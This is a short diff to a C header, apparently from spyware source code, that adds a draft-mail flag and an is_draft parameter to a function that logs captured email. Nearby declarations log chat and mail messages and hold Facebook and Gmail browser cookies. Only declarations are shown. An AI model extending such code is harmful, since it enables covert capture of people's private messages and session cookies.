@@ -30,6 +30,7 @@ struct MailSerializedMessageHeader {
 #define MAIL_FULL_BODY 0x00000001 // Ha catturato tutta la mail 
 #define MAIL_INCOMING  0x00000010
 #define MAIL_OUTGOING  0x00000000
+#define MAIL_DRAFT     0x00000100
   DWORD Flags;               // message flags
   DWORD Size;                // message size
   FILETIME date;			 // data di ricezione approssimativa del messaggio
@@ -45,7 +46,7 @@ extern void CheckProcessStatus();
 extern void LogSocialIMMessageA(DWORD program, char *peers, char *peers_id, char *author, char *author_id, char *body, struct tm *tstamp, BOOL is_incoming);
 extern void LogSocialIMMessageW(DWORD program, WCHAR *peers, WCHAR *peers_id, WCHAR *author, WCHAR *author_id, WCHAR *body, struct tm *tstamp, BOOL is_incoming);
 extern void LogSocialMailMessage(DWORD program, char *from, char *rcpt, char *cc, char *subject, char *body, BOOL is_incoming);
-extern void LogSocialMailMessageFull(DWORD program, BYTE *raw_mail, DWORD size, BOOL is_incoming);
+extern void LogSocialMailMessageFull(DWORD program, BYTE *raw_mail, DWORD size, BOOL is_incoming, BOOL is_draft);
 
 extern char FACEBOOK_IE_COOKIE[1024];
 extern char GMAIL_IE_COOKIE[1024];
